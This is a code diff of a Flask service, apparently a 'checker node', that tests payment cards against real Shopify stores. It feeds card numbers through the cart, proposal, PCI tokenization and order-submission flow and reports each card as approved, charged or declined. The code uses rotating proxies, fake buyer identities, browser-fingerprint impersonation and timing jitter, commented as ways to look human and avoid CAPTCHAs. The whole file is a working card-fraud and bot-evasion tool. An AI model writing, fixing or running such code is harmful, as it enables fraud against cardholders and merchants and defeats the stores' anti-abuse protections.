@@ -1,56 +1,53 @@
 """
-app.py — Shopify Checkout Node (FIXED)
+app.py — Shopify Checkout Node (FULLY FIXED)
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-FIXES in this version:
-  ✅ faulthandler dumps thread stacks every 90s -> pinpoints hangs
-  ✅ _hard_req(): every network call wrapped in a hard wall-clock timeout
-     (if curl_cffi/libcurl stalls, we get control back instead of freezing)
-  ✅ Unified Status field in every response -> stop relying on Approved
-  ✅ 3DS returns Approved=False, CardValid=True -> no more fake "ORDER PLACED"
-  ✅ Polling uses server-returned pollDelay (0.5s) instead of fixed 2s
-     -> ~15s faster per check, no more wrapper timeouts
-  ✅ Jitter between proposal stages -> cuts CAPTCHA rate
-  ✅ Budget-aware retry loops (no overrun past BUDGET_SEC)
-  ✅ Default BUDGET_SEC reduced to 30s
+FIXES:
+  ✅ Paired UA/impersonate (was mismatched → caused CAPTCHA)
+  ✅ 3DS returns Approved=False, CardValid=True (no fake ORDER PLACED)
+  ✅ Hard wall-clock timeout wrapper (no freezes)
+  ✅ Server pollDelay used (was 2s fixed → caused wrapper timeouts)
+  ✅ BUDGET_SEC=18 (fits inside node_client 30s)
+  ✅ faulthandler dumps thread stacks every 90s
 """
-import os, re, html, json, time, uuid, random, string, socket, threading
+import os, re, html, json, time, uuid, random, string, threading
 import concurrent.futures, faulthandler, urllib3
-from urllib.parse import urlencode
 from flask import Flask, request, jsonify
 from curl_cffi import requests
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-# ── HANG DEBUGGING ───────────────────────────────────────────────────────────
 faulthandler.enable()
-faulthandler.dump_traceback_later(90, repeat=True)   # every 90s dump thread stacks
+faulthandler.dump_traceback_later(90, repeat=True)
 
 app = Flask(__name__)
 
-# ─────────────────────────────────────────────────────────────────────────────
 WORKERS_CAP      = int(os.environ.get("WORKERS_CAP", "20"))
-BUDGET_SEC       = float(os.environ.get("BUDGET_SEC", "30"))
-HARD_REQ_TIMEOUT = float(os.environ.get("HARD_REQ_TIMEOUT", "18"))
+BUDGET_SEC       = float(os.environ.get("BUDGET_SEC", "18"))
+HARD_REQ_TIMEOUT = float(os.environ.get("HARD_REQ_TIMEOUT", "12"))
 
-# global executor for hard timeouts — prevents one hung libcurl call from
-# blocking the whole worker forever
 _EXEC = concurrent.futures.ThreadPoolExecutor(max_workers=64, thread_name_prefix="req")
 
 def _hard_req(session, method, url, hard_timeout=HARD_REQ_TIMEOUT, **kwargs):
-    """Wrap session.request() in a worker thread with a hard wall-clock timeout."""
-    def _do():
-        return session.request(method, url, **kwargs)
+    def _do(): return session.request(method, url, **kwargs)
     fut = _EXEC.submit(_do)
     try:
         return fut.result(timeout=hard_timeout)
     except concurrent.futures.TimeoutError:
         raise TimeoutError(f"hard_timeout_{int(hard_timeout)}s url={url[:70]}")
 
-def _jitter(lo=0.3, hi=0.9):
-    """Small random delay between stages — makes traffic look human."""
+def _jitter(lo=0.15, hi=0.45):
     time.sleep(random.uniform(lo, hi))
 
-# ── PRODUCT POOL ─────────────────────────────────────────────────────────────
+# ── PAIRED fingerprint — UA MUST match impersonate profile ───────────────────
+FINGERPRINTS = [
+    ("chrome124", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"),
+    ("chrome120", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
+    ("chrome116", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"),
+    ("chrome110", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"),
+    ("edge101",   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 Edg/101.0.1210.47"),
+    ("safari15_5","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15"),
+]
+
+# ── PRODUCTS ─────────────────────────────────────────────────────────────────
 _PRODUCTS_LIST = []
 _PRODUCT_POOL = []
 _PRODUCT_LOCK = threading.Lock()
@@ -67,10 +64,8 @@ def _load_products():
                 try: pv = float(m.group(2))
                 except ValueError: pv = 0.0
                 if pv < 1.00: continue
-                _PRODUCTS_LIST.append({
-                    "vid": m.group(1), "price": str(m.group(2)),
-                    "shop": m.group(3).strip().rstrip('/')
-                })
+                _PRODUCTS_LIST.append({"vid": m.group(1), "price": str(m.group(2)),
+                                       "shop": m.group(3).strip().rstrip('/')})
         if _PRODUCTS_LIST:
             print(f"[NODE] Loaded {len(_PRODUCTS_LIST)} valid products", flush=True)
     except Exception as e:
@@ -89,14 +84,12 @@ def _get_next_product():
 _GRAPHQL_CACHE = {}
 _GRAPHQL_LOCK  = threading.Lock()
 
-# ── STATE & LOGGING ──────────────────────────────────────────────────────────
+# ── STATE ────────────────────────────────────────────────────────────────────
 _workers_busy = 0
 _workers_lock = threading.Lock()
-
 def _inc_busy():
     global _workers_busy
     with _workers_lock: _workers_busy += 1
-
 def _dec_busy():
     global _workers_busy
     with _workers_lock: _workers_busy = max(0, _workers_busy - 1)
@@ -112,13 +105,7 @@ def log(msg):
         if len(_check_logs) > 400: _check_logs.pop(0)
     print(msg, flush=True)
 
-# ── IDENTITIES / PROXIES ─────────────────────────────────────────────────────
-BROWSER_PROFILES = ["chrome124","chrome120","chrome116","chrome110","edge101","safari15_5"]
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
-]
+# ── IDENTITY / PROXY ─────────────────────────────────────────────────────────
 FIRST_NAMES   = ["james","john","robert","michael","william","david","richard","joseph","thomas","charles"]
 LAST_NAMES    = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez"]
 EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","hotmail.com"]
@@ -154,8 +141,7 @@ def _parse_proxy(s):
     parts = p.split(":")
     if len(parts) == 2: return f"socks5h://{parts[0]}:{parts[1]}"
     if len(parts) >= 4:
-        host, port, user = parts[0], parts[1], parts[2]
-        return f"socks5h://{user}:{':'.join(parts[3:])}@{host}:{port}"
+        return f"socks5h://{parts[2]}:{':'.join(parts[3:])}@{parts[0]}:{parts[1]}"
     return f"socks5h://{p}"
 
 # ── EXTRACTIONS ──────────────────────────────────────────────────────────────
@@ -228,18 +214,6 @@ def _is_shipping_required(b):
         return sp.get("isShippingRequired", True)
     except Exception: return True
 
-def _delivery_handle(b):
-    try:
-        d = json.loads(b)
-        sp = (d.get("data",{}).get("session",{}).get("negotiate",{}).get("result",{}).get("sellerProposal",{}))
-        sds = sp.get("selectedDeliveryStrategy",{})
-        if isinstance(sds, dict) and sds.get("handle"): return sds["handle"]
-        for dg in sp.get("deliveryGroups",[]):
-            for opt in dg.get("deliveryOptions",[]):
-                if isinstance(opt, dict) and opt.get("handle"): return opt["handle"]
-    except Exception: pass
-    return ""
-
 def _payment_method_id(b):
     try: data = json.loads(b)
     except Exception:
@@ -307,8 +281,7 @@ def _graphql_ids(session, shop_url, checkout_html, ua, t_rem):
     if not m: return None, None, None
     try:
         r = _hard_req(session, "GET", shop_url + m.group(1),
-                      hard_timeout=min(t_rem, 8),
-                      headers={"user-agent": ua}, timeout=t_rem)
+                      hard_timeout=min(t_rem, 8), headers={"user-agent": ua}, timeout=t_rem)
         js = r.text
         p = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"', js)
         s = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"', js)
@@ -336,24 +309,24 @@ def _proposal_payload(session_token, stable_id, vid, amount, currency, email, ad
     return {
         "variables": {
             "sessionInput": {"sessionToken": session_token},
-            "queueToken":   None,
-            "discounts":    {"lines": [], "acceptUnexpectedDiscounts": True},
+            "queueToken": None,
+            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
             "delivery": {
                 "deliveryLines": [{
                     "destination": dest,
                     "selectedDeliveryStrategy": {
                         "deliveryStrategyMatchingConditions": {
                             "estimatedTimeInTransit": {"any": True},
-                            "shipments":              {"any": True}},
+                            "shipments": {"any": True}},
                         "options": {}},
                     "targetMerchandiseLines": target_lines,
-                    "deliveryMethodTypes":    ["NONE"],
-                    "expectedTotalPrice":     {"any": True},
-                    "destinationChanged":     True}],
-                "noDeliveryRequired":            [],
-                "useProgressiveRates":           False,
+                    "deliveryMethodTypes": ["NONE"],
+                    "expectedTotalPrice": {"any": True},
+                    "destinationChanged": True}],
+                "noDeliveryRequired": [],
+                "useProgressiveRates": False,
                 "prefetchShippingRatesStrategy": None,
-                "supportsSplitShipping":         True},
+                "supportsSplitShipping": True},
             "deliveryExpectations": {"deliveryExpectationLines": []},
             "merchandise": {merch_key: [{
                 "stableId": stable_id,
@@ -362,19 +335,16 @@ def _proposal_payload(session_token, stable_id, vid, amount, currency, email, ad
                     "variantId": f"gid://shopify/ProductVariant/{vid}",
                     "properties": [], "sellingPlanId": None, "sellingPlanDigest": None}},
                 "quantity": {"items": {"value": 1}},
-                "expectedTotalPrice":   {"any": True},
+                "expectedTotalPrice": {"any": True},
                 "lineComponentsSource": None,
-                "lineComponents":       []}]},
+                "lineComponents": []}]},
             "memberships": {"memberships": []},
             "payment": {"totalAmount": {"any": True}, "paymentLines": [], "billingAddress": bill},
             "buyerIdentity": {
-                "customer":         {"presentmentCurrency": currency, "countryCode": "US"},
-                "email":            email or None,
-                "emailChanged":     bool(email),
-                "phoneCountryCode": "US",
-                "marketingConsent": [],
-                "shopPayOptInPhone": {"countryCode": "US"},
-                "rememberMe":       False},
+                "customer": {"presentmentCurrency": currency, "countryCode": "US"},
+                "email": email or None, "emailChanged": bool(email),
+                "phoneCountryCode": "US", "marketingConsent": [],
+                "shopPayOptInPhone": {"countryCode": "US"}, "rememberMe": False},
             "tip": {"tipLines": []},
             "poNumber": None,
             "taxes": {"proposedAllocations": None, "proposedTotalAmount": {"any": True},
@@ -393,7 +363,7 @@ def _proposal_payload(session_token, stable_id, vid, amount, currency, email, ad
         "id": proposal_id,
     }
 
-# ── PCI TOKENIZATION ─────────────────────────────────────────────────────────
+# ── PCI ──────────────────────────────────────────────────────────────────────
 def _tokenize(session, ccn, mm, yyyy, cvv, name, shop_domain, ua, ident_sig="", vault_url="",
               vault_domain="", proxy_url="", t_rem=5):
     _DEFAULT_VAULT = "https://checkout.pci.shopifyinc.com/sessions"
@@ -434,7 +404,7 @@ def _base_resp(status, *, price="0 USD", charged=False, approved=False,
                card_valid=False, elapsed_ms=None, **extra):
     d = {
         "Response": status,
-        "Status":   status,                          # ← unified field
+        "Status":   status,
         "Gate":     "Shopify Payments",
         "Charged":  "True" if charged else "False",
         "Approved": "True" if approved else "False",
@@ -452,11 +422,10 @@ def _resp(response, *, charged=False, approved=False, price="0 USD", elapsed_ms=
 def _resp_poll(raw_body, *, price="0 USD", poll_attempt=0, http_status=None,
                status="POLLFORRECEIPT", success=False, approved=False,
                charged=False, card_valid=False, elapsed_ms=None):
-    return _base_resp(
-        status, price=price, charged=charged, approved=approved,
-        card_valid=card_valid, elapsed_ms=elapsed_ms,
-        PollAttempt=poll_attempt, PollHttpStatus=http_status,
-        FullPollResponse=raw_body, success=success)
+    return _base_resp(status, price=price, charged=charged, approved=approved,
+                      card_valid=card_valid, elapsed_ms=elapsed_ms,
+                      PollAttempt=poll_attempt, PollHttpStatus=http_status,
+                      FullPollResponse=raw_body, success=success)
 
 def _resp_submit(raw_body, *, price="0 USD", status="SUBMIT_REJECTED", elapsed_ms=None):
     return _base_resp(status, price=price, elapsed_ms=elapsed_ms,
@@ -464,7 +433,7 @@ def _resp_submit(raw_body, *, price="0 USD", status="SUBMIT_REJECTED", elapsed_m
 
 def _classify_failed(code):
     c = (code or "").upper()
-    if "INSUFFICIENT" in c or c == "FUNDS":    return "INSUFFICIENT_FUNDS", True,  False
+    if "INSUFFICIENT" in c or c == "FUNDS":    return "INSUFFICIENT_FUNDS", False, False
     if "GENERIC" in c:                         return "GENERIC_ERROR",      False, False
     if "EXPIRED" in c:                         return "CARD_EXPIRED",       False, False
     if "INVALID" in c:                         return "INVALID_CARD",       False, False
@@ -475,8 +444,8 @@ def _classify_failed(code):
 # ── MAIN PIPELINE ────────────────────────────────────────────────────────────
 def _run_check(card_str, proxy_str):
     t_start = time.monotonic()
-    def remain():  return BUDGET_SEC - (time.monotonic() - t_start)
-    def t_max(s):  return min(s, max(1, remain()))
+    def remain(): return BUDGET_SEC - (time.monotonic() - t_start)
+    def t_max(s): return min(s, max(1, remain()))
 
     parts = card_str.split("|")
     if len(parts) < 4: return _resp("INVALID_CARD")
@@ -489,21 +458,21 @@ def _run_check(card_str, proxy_str):
 
     log(f"🃏 [START] {ccn[:6]}*** | Shop: {shop_url} | Vid: {vid}")
     proxy_url = _parse_proxy(proxy_str)
-    ua  = random.choice(USER_AGENTS)
-    imp = random.choice(BROWSER_PROFILES)
+    imp, ua = random.choice(FINGERPRINTS)  # ← PAIRED, no mismatch
 
     session = requests.Session(impersonate=imp)
     if proxy_url: session.proxies = {"http": proxy_url, "https": proxy_url}
 
     try:
-        # ── Step 1: Cart ────────────────────────────────────────────────────
+        # Step 1: Cart
         cart_url = f"{shop_url}/cart/{vid}:1"
         r = None
         for cart_attempt in range(2):
             if remain() < 8: break
             try:
                 log(f"  Step 1: Cart Request (attempt {cart_attempt+1}) -> {cart_url}")
-                r = _hard_req(session, "GET", cart_url, hard_timeout=min(14, max(6, int(remain()))),
+                r = _hard_req(session, "GET", cart_url,
+                              hard_timeout=min(14, max(6, int(remain()))),
                               headers={"user-agent": ua}, allow_redirects=True, timeout=t_max(10))
                 log(f"  Step 1: Cart Status -> {r.status_code}")
                 if r.status_code == 200: break
@@ -556,8 +525,8 @@ def _run_check(card_str, proxy_str):
         prop_url = f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal"
         use_lines = False
 
-        # ── Step 2: Proposal 1 (empty) ──────────────────────────────────────
-        _jitter(0.2, 0.6)
+        # Step 2: Proposal 1
+        _jitter()
         try:
             log("  Step 2: Proposal 1 (Empty)")
             p = _proposal_payload(session_token, stable_id, vid, amount, currency, None, None, prop_id, use_lines, True)
@@ -579,8 +548,8 @@ def _run_check(card_str, proxy_str):
         queue_token = _queue_token(r1.text) or None
         if not queue_token: return _resp("P1_NO_QUEUE", price=f"{amount} {currency}")
 
-        # ── Step 3: Proposal 2 (email) ──────────────────────────────────────
-        _jitter(0.3, 0.9)
+        # Step 3: Proposal 2
+        _jitter()
         try:
             log("  Step 3: Proposal 2 (Email)")
             p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, None, prop_id, use_lines, True)
@@ -593,10 +562,9 @@ def _run_check(card_str, proxy_str):
         log(f"  Step 3: Proposal 2 Status -> {r2.status_code}")
         if r2.status_code != 200: return _resp("P2_HTTP", price=f"{amount} {currency}")
 
-        # ── Step 4: Proposal 3 (address) ────────────────────────────────────
-        _jitter(0.3, 1.0)
-        pm_id = ""; del_h = ""; signed = []; tax = "0.0"
-        amount_f = amount; shipping_required = True; r3_text = ""
+        # Step 4: Proposal 3
+        _jitter()
+        pm_id = ""; tax = "0.0"; amount_f = amount; shipping_required = True
         try:
             log("  Step 4: Proposal 3 (Address / Target Item)")
             p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, prop_id, use_lines, False)
@@ -610,8 +578,6 @@ def _run_check(card_str, proxy_str):
                 if "SHIPPING_ADDRESS_UNDELIVERABLE" in r3_text or "no_delivery_options" in r3_text:
                     return _resp("SKIP_PHYSICAL", price=f"{amount} {currency}")
                 pm_id  = _payment_method_id(r3_text) or _payment_method_id(r2.text) or _payment_method_id(r1.text)
-                del_h  = _delivery_handle(r3_text)
-                signed = _signed_handles(r3_text) if False else []
                 tax    = _tax_amount(r3_text)
                 amount_f = _checkout_total(r3_text) or amount
                 queue_token = _queue_token(r3_text) or queue_token
@@ -622,15 +588,12 @@ def _run_check(card_str, proxy_str):
             log(f"  Step 4: Proposal 3 EXC -> {str(e)[:100]}")
             return _resp("SKIP_PHYSICAL", price=f"{amount} {currency}")
 
-        if not pm_id:
-            pm_id = _payment_method_id_from_html(checkout_html)
-        if not pm_id:
-            return _resp("SKIP_NO_PM", price=f"{amount_f} {currency}")
-        if shipping_required:
-            return _resp("SKIP_PHYSICAL", price=f"{amount_f} {currency}")
+        if not pm_id: pm_id = _payment_method_id_from_html(checkout_html)
+        if not pm_id: return _resp("SKIP_NO_PM", price=f"{amount_f} {currency}")
+        if shipping_required: return _resp("SKIP_PHYSICAL", price=f"{amount_f} {currency}")
 
-        # ── Step 5: PCI tokenize ────────────────────────────────────────────
-        _jitter(0.3, 0.8)
+        # Step 5: PCI
+        _jitter()
         ident_sig = _ident_sig(checkout_html)
         v_url     = _vault_url(checkout_html)
         v_dom     = _vault_domain(checkout_html)
@@ -643,34 +606,33 @@ def _run_check(card_str, proxy_str):
                          elapsed_ms=(time.monotonic()-t_start)*1000)
         log("  Step 5: PCI Token Success")
 
-        # ── Step 6: Submit ──────────────────────────────────────────────────
+        # Step 6: Submit
         sa = _street_addr(fn, ln, addr_raw)
         price_str = f"{amount_f} {currency}"
         merch_key = "lines" if use_lines else "merchandiseLines"
 
         def _build_submit(cur_tax, cur_total):
-            delivery_block = {
-                "deliveryLines": [{
-                    "selectedDeliveryStrategy": {
-                        "deliveryStrategyMatchingConditions": {
-                            "estimatedTimeInTransit": {"any": True},
-                            "shipments":              {"any": True}},
-                        "options": {}},
-                    "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
-                    "deliveryMethodTypes":    ["NONE"],
-                    "expectedTotalPrice":     {"any": True},
-                    "destinationChanged":     True}],
-                "noDeliveryRequired":            [],
-                "useProgressiveRates":           False,
-                "prefetchShippingRatesStrategy": None,
-                "supportsSplitShipping":         True}
             return {
                 "variables": {
                     "input": {
                         "sessionInput": {"sessionToken": session_token},
-                        "queueToken":   queue_token,
-                        "discounts":    {"lines": [], "acceptUnexpectedDiscounts": True},
-                        "delivery": delivery_block,
+                        "queueToken": queue_token,
+                        "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
+                        "delivery": {
+                            "deliveryLines": [{
+                                "selectedDeliveryStrategy": {
+                                    "deliveryStrategyMatchingConditions": {
+                                        "estimatedTimeInTransit": {"any": True},
+                                        "shipments": {"any": True}},
+                                    "options": {}},
+                                "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
+                                "deliveryMethodTypes": ["NONE"],
+                                "expectedTotalPrice": {"any": True},
+                                "destinationChanged": True}],
+                            "noDeliveryRequired": [],
+                            "useProgressiveRates": False,
+                            "prefetchShippingRatesStrategy": None,
+                            "supportsSplitShipping": True},
                         "deliveryExpectations": {"deliveryExpectationLines": []},
                         "merchandise": {merch_key: [{
                             "stableId": stable_id,
@@ -687,10 +649,10 @@ def _run_check(card_str, proxy_str):
                             "paymentLines": [{
                                 "paymentMethod": {
                                     "directPaymentMethod": {
-                                        "sessionId":               sid,
+                                        "sessionId": sid,
                                         "paymentMethodIdentifier": pm_id,
-                                        "billingAddress":          {"streetAddress": sa},
-                                        "cardSource":              None},
+                                        "billingAddress": {"streetAddress": sa},
+                                        "cardSource": None},
                                     "giftCardPaymentMethod": None, "ownedGiftCardPaymentMethod": None,
                                     "redeemablePaymentMethod": None, "walletPaymentMethod": None,
                                     "walletsPlatformPaymentMethod": None, "localPaymentMethod": None,
@@ -704,12 +666,12 @@ def _run_check(card_str, proxy_str):
                             "creditCardBin": ccn[:6],
                             "allowStoreCredit": False},
                         "buyerIdentity": {
-                            "customer":         {"presentmentCurrency": currency, "countryCode": "US"},
-                            "email":            email, "emailChanged": False,
+                            "customer": {"presentmentCurrency": currency, "countryCode": "US"},
+                            "email": email, "emailChanged": False,
                             "phoneCountryCode": "US",
                             "marketingConsent": [{"email": {"consentState": "DECLINED", "value": email}}],
                             "shopPayOptInPhone": {"number": "", "countryCode": "US"},
-                            "rememberMe":       False},
+                            "rememberMe": False},
                         "tip": {"tipLines": []},
                         "poNumber": None,
                         "taxes": {"proposedAllocations": None,
@@ -726,7 +688,7 @@ def _run_check(card_str, proxy_str):
                         "optionalDuties": {"buyerRefusesDuties": False},
                         "cartMetafields": []},
                     "attemptToken": f"{cart_token}-{_rand_suffix()}",
-                    "metafields":   [],
+                    "metafields": [],
                     "analytics": {"requestUrl": checkout_url, "pageId": str(uuid.uuid4())}},
                 "operationName": "SubmitForCompletion",
                 "id": submit_id}
@@ -759,24 +721,21 @@ def _run_check(card_str, proxy_str):
                 if nt: cur_tax = nt
                 if nT: cur_tot = nT
                 price_str = f"{cur_tot} {currency}"
-                _jitter(0.3, 0.8)
+                _jitter()
                 continue
             break
 
         log(f"  Step 6: Submit Response -> {body[:400]}")
 
-        # ── Step 7: PollForReceipt ──────────────────────────────────────────
+        # Step 7: Poll
         rid = _receipt_id(body)
         rss = _receipt_session(body) or session_token
         if not rid:
-            log("  Step 7: No receipt id in submit body.")
             return _resp_submit(body, price=price_str, status="NO_RECEIPT",
                                 elapsed_ms=(time.monotonic()-t_start)*1000)
 
-        # use server-provided pollDelay, fallback 0.5s
         pdm = re.search(r'"pollDelay"\s*:\s*(\d+)', body)
-        poll_delay = int(pdm.group(1)) / 1000.0 if pdm else 0.5
-        poll_delay = min(max(poll_delay, 0.3), 1.5)
+        poll_delay = min(max((int(pdm.group(1)) / 1000.0) if pdm else 0.5, 0.3), 1.5)
 
         log(f"  Step 7: Polling receipt {rid[:50]}... (delay={poll_delay:.2f}s)")
         poll_headers = hdr.copy(); poll_headers["accept-language"] = "en-US"
@@ -797,8 +756,7 @@ def _run_check(card_str, proxy_str):
                 pb = r_p.text
                 last_pb = pb; last_http = r_p.status_code
                 all_poll_bodies.append({"attempt": poll_attempt, "http": r_p.status_code, "body": pb})
-                log(f"    Poll {poll_attempt}/10: HTTP {r_p.status_code} | FULL RESPONSE:")
-                log(f"    {pb}")
+                log(f"    Poll {poll_attempt}/10: HTTP {r_p.status_code} | {pb[:200]}")
 
                 compact = pb.replace(" ", "")
                 if '"__typename":"ProcessedReceipt"' in compact:
@@ -815,20 +773,15 @@ def _run_check(card_str, proxy_str):
                         http_status=r_p.status_code, status=status, success=False,
                         approved=apv, charged=chg, elapsed_ms=(time.monotonic()-t_start)*1000)
                 if '"__typename":"ActionRequiredReceipt"' in compact:
-                    # 3DS REQUIRED — do NOT report as success or approved.
-                    # card_valid=True so the wrapper knows the card passed the
-                    # issuer's initial risk check.
-                    log("  Step 7: 🔔 3DS REQUIRED")
+                    log("  Step 7: 🔔 3DS REQUIRED (card valid)")
                     return _resp_poll(pb, price=price_str, poll_attempt=poll_attempt,
                         http_status=r_p.status_code, status="3DS_AUTHENTICATION_REQUIRED",
                         success=False, approved=False, charged=False, card_valid=True,
                         elapsed_ms=(time.monotonic()-t_start)*1000)
-                log(f"    Poll {poll_attempt}: still processing, continuing...")
             except Exception as e:
                 log(f"    Poll {poll_attempt}: EXC -> {str(e)[:120]}")
                 continue
 
-        log(f"  Step 7: Polling exhausted after {len(all_poll_bodies)} attempts")
         return _base_resp("POLL_EXHAUSTED", price=price_str,
             elapsed_ms=(time.monotonic()-t_start)*1000,
             PollAttempt=len(all_poll_bodies), PollHttpStatus=last_http,
@@ -841,8 +794,6 @@ def _run_check(card_str, proxy_str):
     finally:
         try: session.close()
         except Exception: pass
-
-def _signed_handles(b): return []  # placeholder kept for signature compat
 
 # ── ROUTES ───────────────────────────────────────────────────────────────────
 @app.route("/")
@@ -865,7 +816,6 @@ def route_health():
 
 @app.route("/debug")
 def route_debug():
-    global _check_logs
     with _log_lock: logs = list(_check_logs)
     return jsonify({"last_failure": _last_failure, "logs": logs})
 
